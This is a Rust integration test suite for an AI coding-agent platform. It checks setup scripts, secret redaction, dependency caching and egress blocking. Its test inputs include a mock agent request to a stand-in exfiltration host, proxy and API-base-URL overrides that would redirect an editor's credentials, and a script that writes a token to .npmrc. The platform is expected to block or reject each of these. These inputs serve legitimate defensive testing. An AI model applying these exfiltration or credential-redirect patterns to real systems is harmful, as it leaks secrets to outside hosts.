//! WP02 integration tests: project environments, setup phase, secrets,
//! dependency cache and egress events. App + real runner (engine `none`,
//! egress proxy on loopback) + Postgres, mock provider, driven through the
//! HTTP API. No external calls: refused targets are refused before DNS,
//! allowed targets are local fake servers (`127.0.0.1` is a private host of
//! the test runner, like `RUNNER_EGRESS_PRIVATE_HOSTS`).
mod common;

use std::sync::{
    atomic::{AtomicUsize, Ordering},
    Arc,
};

use common::{start, Client, Harness};
use serde_json::{json, Value};
use sqlx::PgPool;

const SECRET: &str = "super-secret-value-4711";

fn env_body(script: &str) -> Value {
    json!({
        "setup_script": script,
        "setup_timeout_secs": 60,
        "env_vars": [{"name": "NODE_ENV", "value": "ci"}],
        "setup_network": {"mode": "off", "presets": [], "domains": [], "read_only": false},
        "agent_network": {"mode": "off", "presets": [], "domains": [], "read_only": false},
        "cache_enabled": true,
        "cache_files": []
    })
}

async fn project(a: &Client) -> String {
    let p = a.project(json!({"name": "Env"})).await;
    let (code, _) = a
        .patch(
            &format!("/api/projects/{p}"),
            json!({"review_enabled": false}),
        )
        .await;
    assert_eq!(code, 200);
    p
}

async fn set_env(a: &Client, p: &str, body: Value) -> Value {
    let (code, v) = a.put(&format!("/api/projects/{p}/environment"), body).await;
    assert_eq!(code, 200, "{v}");
    v
}

async fn set_secret(a: &Client, p: &str, name: &str, value: &str) -> u16 {
    a.put(
        &format!("/api/projects/{p}/secrets/{name}"),
        json!({"value": value}),
    )
    .await
    .0
}

fn has(ev: &[(String, String)], kind: &str, needle: &str) -> bool {
    ev.iter().any(|(k, c)| k == kind && c.contains(needle))
}

async fn member(h: &Harness, owner: &Client, p: &str, email: &str, role: &str) -> Client {
    let c = h.user(email).await;
    let (code, _) = owner
        .post(
            &format!("/api/projects/{p}/members"),
            json!({"email": email, "role": role}),
        )
        .await;
    assert_eq!(code, 200);
    c
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn environment_api_roles_validation_and_secret_privacy(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("owner@x.ch").await;
    let p = project(&a).await;
    let editor = member(&h, &a, &p, "ed@x.ch", "editor").await;
    let viewer = member(&h, &a, &p, "vi@x.ch", "viewer").await;
    let stranger = h.user("st@x.ch").await;

    // Defaults: agent phase default-deny, setup phase package registries,
    // the dev engine is reported as not enforcing anything.
    let (code, d) = a.get(&format!("/api/projects/{p}/environment")).await;
    assert_eq!(code, 200, "{d}");
    assert_eq!(d["agent_network"]["mode"], "off");
    assert_eq!(d["setup_network"]["mode"], "allowlist");
    assert!(d["setup_network"]["presets"]
        .as_array()
        .unwrap()
        .contains(&json!("npm")));
    assert_eq!(d["updated_at"], Value::Null);
    assert_eq!(
        d["sandbox"],
        json!({"engine": "none", "egress_enforced": false})
    );
    // Public metadata does not tell anonymous visitors what is enforced.
    let (_, meta) = h.anon().get("/api/meta").await;
    assert!(meta.get("sandbox").is_none(), "{meta}");

    // Owner saves; domains are canonicalised.
    let mut body = env_body("npm ci");
    body["agent_network"] = json!({"mode": "allowlist", "presets": ["pypi"], "domains": ["Docs.RS", "docs.rs"], "read_only": true});
    let v = set_env(&a, &p, body.clone()).await;
    assert_eq!(v["agent_network"]["domains"], json!(["docs.rs"]));
    assert!(v["updated_at"].is_string());

    // Validation errors are 400 with a German message.
    for bad in [
        json!({"agent_network": {"mode": "allowlist", "presets": [], "domains": ["https://x.com/a"], "read_only": false}}),
        json!({"env_vars": [{"name": "HTTPS_PROXY", "value": "http://evil"}]}),
        // Would send an editor's API key (agent runs use the task creator's
        // credentials) to a host of the owner's choice.
        json!({"env_vars": [{"name": "ANTHROPIC_BASE_URL", "value": "https://owner.example"}]}),
        json!({"setup_timeout_secs": 1}),
        json!({"setup_network": {"mode": "allowlist", "presets": ["nope"], "domains": [], "read_only": false}}),
    ] {
        let mut b = body.clone();
        for (k, val) in bad.as_object().unwrap() {
            b[k] = val.clone();
        }
        let (code, e) = a.put(&format!("/api/projects/{p}/environment"), b).await;
        assert_eq!(code, 400, "{e}");
    }
    // Unknown mode is refused by the type (422) – never stored.
    let mut b = body.clone();
    b["agent_network"]["mode"] = json!("wide-open");
    assert_eq!(
        a.put(&format!("/api/projects/{p}/environment"), b).await.0,
        422
    );

    // Only the owner changes the environment and the secrets.
    assert_eq!(
        editor
            .put(&format!("/api/projects/{p}/environment"), body.clone())
            .await
            .0,
        403
    );
    assert_eq!(set_secret(&editor, &p, "NPM_TOKEN", SECRET).await, 403);
    assert_eq!(
        stranger
            .get(&format!("/api/projects/{p}/environment"))
            .await
            .0,
        404
    );
    assert_eq!(set_secret(&a, &p, "npm_token", SECRET).await, 400);
    assert_eq!(set_secret(&a, &p, "NPM_TOKEN", "short").await, 400);
    assert_eq!(set_secret(&a, &p, "HTTP_PROXY", SECRET).await, 400);
    assert_eq!(set_secret(&a, &p, "NPM_TOKEN", SECRET).await, 200);
    assert_eq!(
        set_secret(&a, &p, "NPM_TOKEN", "replaced-value-1").await,
        200
    );

    // Everybody in the project sees the names, nobody the values.
    for c in [&a, &editor, &viewer] {
        let (code, v) = c.get(&format!("/api/projects/{p}/environment")).await;
        assert_eq!(code, 200);
        assert_eq!(v["secrets"][0]["name"], "NPM_TOKEN");
        let raw = v.to_string();
        assert!(
            !raw.contains(SECRET) && !raw.contains("replaced-value-1"),
            "{raw}"
        );
    }
    let stored: Vec<u8> = sqlx::query_scalar("SELECT value_enc FROM project_secrets")
        .fetch_one(&h.st.db)
        .await
        .unwrap();
    assert!(
        !String::from_utf8_lossy(&stored).contains("replaced-value-1"),
        "encrypted at rest"
    );

    // Cache can be cleared by editors (widens nothing), not by viewers.
    assert_eq!(
        editor
            .post(
                &format!("/api/projects/{p}/environment/cache/clear"),
                json!({})
            )
            .await
            .0,
        200
    );
    assert_eq!(
        viewer
            .post(
                &format!("/api/projects/{p}/environment/cache/clear"),
                json!({})
            )
            .await
            .0,
        403
    );

    assert_eq!(
        a.delete(&format!("/api/projects/{p}/secrets/NPM_TOKEN"))
            .await
            .0,
        200
    );
    assert_eq!(
        a.delete(&format!("/api/projects/{p}/secrets/NPM_TOKEN"))
            .await
            .0,
        404
    );
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn setup_runs_first_and_only_it_sees_the_secrets(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    set_env(
        &a,
        &p,
        env_body("echo \"token: $DEPLOY_TOKEN\"\nprintf %s \"$DEPLOY_TOKEN\" | wc -c | tr -d ' ' > .setup-proof\necho \"$NODE_ENV\" > .setup-env"),
    )
    .await;
    assert_eq!(set_secret(&a, &p, "DEPLOY_TOKEN", SECRET).await, 200);
    // Verify runs without the secret but with the variables.
    let (code, _) = a
        .patch(
            &format!("/api/projects/{p}"),
            json!({"verify_command": "test \"$NODE_ENV\" = ci && test -z \"$DEPLOY_TOKEN\""}),
        )
        .await;
    assert_eq!(code, 200);
    let t = a.task(&p, "MOCK_ENV list my environment").await;
    let done = a.wait_status(&t, &["done", "blocked", "failed"]).await["task"].clone();
    assert_eq!(done["status"], "done", "{done}");

    let ev = a.events_of(&t).await;
    assert!(has(&ev, "setup", "Setup startet"), "{ev:?}");
    assert!(has(&ev, "setup", "token: ***"), "redacted: {ev:?}");
    assert!(has(&ev, "setup", "Setup fertig"));
    let all = format!("{ev:?}{done}");
    assert!(!all.contains(SECRET), "secret leaked into events or API");
    // Setup strictly before the agent.
    let setup_done = ev
        .iter()
        .position(|(k, c)| k == "setup" && c == "Setup fertig")
        .unwrap();
    let agent = ev
        .iter()
        .position(|(k, c)| k == "text" && c.contains("mock agent"))
        .unwrap();
    assert!(setup_done < agent);
    assert!(
        has(
            &ev,
            "egress",
            "Netz (Agent): kein Netz – nicht durchgesetzt"
        ),
        "{ev:?}"
    );

    let ws = h.workspace(&p);
    assert_eq!(
        std::fs::read_to_string(ws.join(".setup-proof"))
            .unwrap()
            .trim(),
        SECRET.len().to_string()
    );
    assert_eq!(
        std::fs::read_to_string(ws.join(".setup-env"))
            .unwrap()
            .trim(),
        "ci"
    );
    let names = std::fs::read_to_string(ws.join("MOCK_ENV.txt")).unwrap();
    let names: Vec<&str> = names.lines().collect();
    assert!(names.contains(&"NODE_ENV"), "{names:?}");
    assert!(
        !names.contains(&"DEPLOY_TOKEN"),
        "agent must not see secrets: {names:?}"
    );
    assert!(
        names.contains(&"HTTPS_PROXY"),
        "agent runs behind the proxy: {names:?}"
    );
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn failing_setup_blocks_without_agent_and_without_fix(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    set_env(&a, &p, env_body("echo preparing\nfalse\necho never")).await;
    let t = a.task(&p, "normal work").await;
    let v = a.wait_status(&t, &["blocked", "done", "failed"]).await["task"].clone();
    assert_eq!(v["status"], "blocked", "{v}");
    assert_eq!(v["failure_class"], "config");
    let err = v["error"].as_str().unwrap();
    assert!(
        err.contains("Setup-Skript fehlgeschlagen (Exit 1)") && err.contains("preparing"),
        "{err}"
    );
    assert!(
        !err.contains("never"),
        "sh -e stops at the first failure: {err}"
    );
    let ev = a.events_of(&t).await;
    assert!(
        !ev.iter().any(|(k, _)| k == "text"),
        "agent never started: {ev:?}"
    );
    assert!(!h.workspace(&p).join("MOCK_LOG.md").exists());
    assert_eq!(
        a.tasks()
            .await
            .iter()
            .filter(|t| t["kind"] == "fix")
            .count(),
        0
    );
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn secret_written_to_a_file_blocks_and_is_scrubbed(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    set_env(
        &a,
        &p,
        env_body("echo \"//registry/:_authToken=$NPM_TOKEN\" > .npmrc"),
    )
    .await;
    assert_eq!(set_secret(&a, &p, "NPM_TOKEN", SECRET).await, 200);
    let t = a.task(&p, "MOCK_ENV").await;
    let v = a.wait_status(&t, &["blocked", "done", "failed"]).await["task"].clone();
    assert_eq!(v["status"], "blocked", "{v}");
    let err = v["error"].as_str().unwrap();
    assert!(
        err.contains("NPM_TOKEN in workspace/.npmrc: entfernt"),
        "{err}"
    );
    assert!(
        !h.workspace(&p).join(".npmrc").exists(),
        "leaked file removed"
    );
    assert!(
        !h.workspace(&p).join("MOCK_ENV.txt").exists(),
        "agent never started"
    );
    assert!(!format!("{v}{:?}", a.events_of(&t).await).contains(SECRET));
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn dependency_cache_is_reused_and_invalidated(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    let script = "if [ -e \"$QUEUE_CACHE_DIR/marker\" ]; then echo CACHE-HIT; else echo CACHE-MISS; fi\ntouch \"$QUEUE_CACHE_DIR/marker\"";
    set_env(&a, &p, env_body(script)).await;
    let mut seen = vec![];
    for i in 0..2 {
        let t = a.task(&p, &format!("round {i}")).await;
        assert_eq!(
            a.wait_status(&t, &["done", "blocked", "failed"]).await["task"]["status"],
            "done"
        );
        seen.push(a.events_of(&t).await);
    }
    assert!(has(&seen[0], "setup", "CACHE-MISS") && has(&seen[0], "setup", "neu angelegt"));
    assert!(
        has(&seen[1], "setup", "CACHE-HIT") && has(&seen[1], "setup", "wiederverwendet"),
        "{:?}",
        seen[1]
    );
    // A changed lock file invalidates the cache.
    std::fs::write(
        h.workspace(&p).join("package-lock.json"),
        "{\"lockfileVersion\":3}",
    )
    .unwrap();
    let t = a.task(&p, "after lockfile change").await;
    assert_eq!(
        a.wait_status(&t, &["done", "blocked", "failed"]).await["task"]["status"],
        "done"
    );
    let ev = a.events_of(&t).await;
    assert!(has(&ev, "setup", "CACHE-MISS"), "{ev:?}");
    // Clearing drops it as well.
    assert_eq!(
        a.post(
            &format!("/api/projects/{p}/environment/cache/clear"),
            json!({})
        )
        .await
        .0,
        200
    );
    let t = a.task(&p, "after clear").await;
    assert_eq!(
        a.wait_status(&t, &["done", "blocked", "failed"]).await["task"]["status"],
        "done"
    );
    assert!(has(&a.events_of(&t).await, "setup", "CACHE-MISS"));
}

/// Fake upstream counting its requests.
async fn upstream() -> (u16, Arc<AtomicUsize>) {
    let hits = Arc::new(AtomicUsize::new(0));
    let h2 = hits.clone();
    let app = axum::Router::new().fallback(move || {
        let h = h2.clone();
        async move {
            h.fetch_add(1, Ordering::SeqCst);
            "ok"
        }
    });
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    tokio::spawn(async move { axum::serve(l, app).await.unwrap() });
    (port, hits)
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn egress_decisions_of_every_phase_become_task_events(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    let (port, hits) = upstream().await;
    // `--noproxy ''`: NO_PROXY lists 127.0.0.1 for local dev servers; the
    // test wants this request to go through the proxy.
    let mut body = env_body(&format!(
        "curl -s --noproxy '' -o /dev/null http://127.0.0.1:{port}/allowed\ncurl -s -o /dev/null -w 'connect=%{{http_connect}}\\n' https://blocked.invalid/ || true"
    ));
    body["setup_network"] = json!({"mode": "allowlist", "presets": [], "domains": [format!("127.0.0.1:{port}")], "read_only": false});
    set_env(&a, &p, body).await;
    let t = a.task(&p, "MOCK_NET:https://exfil.invalid/upload").await;
    let v = a.wait_status(&t, &["done", "blocked", "failed"]).await["task"].clone();
    assert_eq!(v["status"], "done", "{v}");
    let ev = a.events_of(&t).await;
    assert!(has(&ev, "setup", "connect=403"), "{ev:?}");
    assert!(
        has(
            &ev,
            "egress",
            "Blockiert (Setup): CONNECT blocked.invalid:443 – nicht in der Allowlist"
        ),
        "{ev:?}"
    );
    assert!(
        has(&ev, "egress", &format!("Netzwerk (Setup): 127.0.0.1:{port} ×1 (Allowlist), 1 blockiert – nicht durchgesetzt")),
        "{ev:?}"
    );
    assert!(
        has(
            &ev,
            "egress",
            "Blockiert (Agent): CONNECT exfil.invalid:443 – Netz in dieser Phase aus"
        ),
        "{ev:?}"
    );
    assert!(
        has(&ev, "text", "net 000/403"),
        "agent saw the refusal: {ev:?}"
    );
    assert_eq!(
        hits.load(Ordering::SeqCst),
        1,
        "only the allowed request reached the server"
    );
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn projects_without_environment_behave_as_before_but_default_deny(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    let t = a
        .task(&p, "MOCK_NET:https://registry.npmjs.org/left-pad")
        .await;
    let v = a.wait_status(&t, &["done", "blocked", "failed"]).await["task"].clone();
    assert_eq!(v["status"], "done", "{v}");
    let ev = a.events_of(&t).await;
    assert!(
        !ev.iter().any(|(k, _)| k == "setup"),
        "no setup without a script"
    );
    assert!(
        has(
            &ev,
            "egress",
            "Blockiert (Agent): CONNECT registry.npmjs.org:443 – Netz in dieser Phase aus"
        ),
        "{ev:?}"
    );
}

#[sqlx::test(migrator = "queued::MIGRATOR")]
async fn cancelling_during_setup_ends_cancelled_without_agent(pool: PgPool) {
    let h = start(pool).await;
    let a = h.user("a@x.ch").await;
    let p = project(&a).await;
    set_env(&a, &p, env_body("echo setup-begins\nsleep 30")).await;
    let t = a.task(&p, "MOCK_ENV").await;
    let mut started = false;
    for _ in 0..100 {
        if has(&a.events_of(&t).await, "setup", "setup-begins") {
            started = true;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    }
    assert!(started, "setup did not start");
    assert_eq!(
        a.post(&format!("/api/tasks/{t}/cancel"), json!({})).await.0,
        200
    );
    let v = a
        .wait_status(&t, &["cancelled", "blocked", "done", "failed"])
        .await["task"]
        .clone();
    assert_eq!(v["status"], "cancelled", "{v}");
    assert!(
        !h.workspace(&p).join("MOCK_ENV.txt").exists(),
        "agent never started"
    );
}
